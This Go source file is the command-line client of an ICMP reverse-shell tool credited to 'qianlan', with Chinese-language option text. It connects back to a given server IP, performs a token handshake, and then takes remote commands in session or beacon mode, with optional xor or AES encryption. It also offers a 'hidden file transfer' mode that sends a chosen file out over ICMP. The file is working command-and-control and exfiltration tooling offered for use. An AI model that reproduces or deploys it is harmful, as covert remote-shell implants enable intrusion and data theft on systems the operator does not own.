// qianlan_icmpsh/cmd/shell/cli.go
package main

import (
	"errors"
	"fmt"
	"github.com/urfave/cli"
	"lichu_icmpsh/shell"
	"log"
	"net"
	"os"
	"time"
)

const (
	MinMtu = 64
)

var (
	app = &cli.App{
		Name:  "icmp_shell-cli",
		Usage: "BY ~~qianlan~~",
		Flags: []cli.Flag{
			cli.StringFlag{Name: "ip, i", Usage: "反向连接的服务端IP (必需)"},
			cli.StringFlag{Name: "token, t", Usage: "握手Token", Value: "qianlan"},
			cli.StringFlag{Name: "filetrans, ft", Usage: "文件传输模式, 指定要传输的文件名"},
			cli.StringFlag{Name: "filetrans-hide, fth", Usage: "隐藏文件传输模式, 指定要传输的文件名"},
			cli.StringFlag{Name: "crypto-mode, cm", Usage: "加密模式 (可选: none, xor, base64, base32, aes)", Value: "none"},
			cli.UintFlag{Name: "icmpId", Usage: "通信ICMP ID", Value: 1000},
			cli.StringFlag{Name: "mode, m", Usage: "运行模式 (可选: session, beacon)", Value: "session"},
			cli.IntFlag{Name: "mtu", Usage: fmt.Sprintf("单包最大载荷 (字节, 最小: %d)", MinMtu), Value: 666},
			cli.IntFlag{Name: "interval", Usage: "发包周期 (秒, 最小: 1)", Value: 1},
		},
		Action: func(c *cli.Context) error {
			// --- 参数check ---
			ipStr := c.String("ip")
			if ipStr == "" {
				return errors.New("错误: 必须提供服务端IP地址 (--ip)")
			}
			parsedIP := net.ParseIP(ipStr)
			if parsedIP == nil {
				return fmt.Errorf("错误: 无效的IP地址格式: %s", ipStr)
			}

			intervalSec := c.Int("interval")
			if intervalSec <= 0 {
				return fmt.Errorf("错误: --interval 的值 (%d) 必须大于0", intervalSec)
			}
			interval := time.Duration(intervalSec) * time.Second

			mtu := c.Int("mtu")
			if mtu < MinMtu {
				return fmt.Errorf("错误: --mtu 的值 (%d) 过小，必须大于等于 %d", mtu, MinMtu)
			}

			token := c.String("token")
			if len(token) >= mtu {
				return fmt.Errorf("错误: --token 的长度 (%d) 不能大于或等于 --mtu 的值 (%d)", len(token), mtu)
			}

			fileToSend := c.String("filetrans")
			fileToHide := c.String("filetrans-hide")

			if fileToSend != "" && fileToHide != "" {
				return errors.New("错误: --filetrans 和 --filetrans-hide 不能同时使用")
			}

			if fileToSend != "" || fileToHide != "" {
				var targetFile string
				var isHideMode bool
				if fileToSend != "" {
					targetFile = fileToSend
					isHideMode = false
					fmt.Println("--- ICMP隧道客户端 (文件传输模式) ---")
				} else {
					targetFile = fileToHide
					isHideMode = true
					fmt.Println("--- ICMP隧道客户端 (隐藏文件传输模式) ---")
				}

				// 文件check
				fileInfo, err := os.Stat(targetFile)
				if os.IsNotExist(err) {
					return fmt.Errorf("错误: 文件不存在: %s", targetFile)
				}
				if fileInfo.IsDir() {
					return fmt.Errorf("错误: 指定的路径是一个目录，不是文件: %s", targetFile)
				}

				// 配置
				config := shell.ShellConfig{
					IP:           parsedIP,
					Token:        []byte(token),
					IcmpID:       uint16(c.Uint("icmpId")),
					Interval:     interval,
					FileToSend:   targetFile,
					FileHideMode: isHideMode,
					Mtu:          mtu,
				}
				// 隐藏模式下，强制Mtu值
				if isHideMode {
					config.Mtu = 56
				}

				s, err := shell.NewShell(config)
				if err != nil {
					log.Fatalf("错误: 初始化客户端失败: %v", err)
				}
				s.SendFile()
				return nil
			}

			mode := c.String("mode")
			if mode != "session" && mode != "beacon" {
				return fmt.Errorf("无效的运行模式: %s", mode)
			}
			fmt.Printf("--- ICMP隧道客户端 ---\n")
			fmt.Printf("[+] 连接目标: %s\n", ipStr)
			fmt.Printf("[+] 运行模式: %s\n", mode)
			if mode == "beacon" {
				fmt.Printf("[+] 心跳周期: %v\n", interval)
			}
			fmt.Printf("[+] 加密模式: %s\n", c.String("crypto-mode"))
			fmt.Printf("[+] 单包最大载荷 (MTU): %d 字节\n", mtu)

			config := shell.ShellConfig{
				IP:         parsedIP,
				Token:      []byte(token),
				CryptoMode: c.String("crypto-mode"),
				IcmpID:     uint16(c.Uint("icmpId")),
				Mode:       mode,
				Mtu:        mtu,
				Interval:   interval,
			}
			s, err := shell.NewShell(config)
			if err != nil {
				log.Fatalf("错误: 初始化客户端失败: %v", err)
			}

			fmt.Println("[+] 正在发送握手请求...")
			err = s.Handshake()
			if err != nil {
				log.Fatalf("错误: handshake failed: %v", err)
			}
			fmt.Println("[+] 握手成功，开始监听指令...")

			if mode == "session" {
				s.ListenICMPSession()
			} else {
				s.StartBeaconLoop()
			}
			return nil
		},
	}
)

func main() {
	if err := app.Run(os.Args); err != nil {
		// 使用log而不是fmt，确保错误信息格式一致
		log.Fatalf("程序运行失败: %v", err)
	}
}
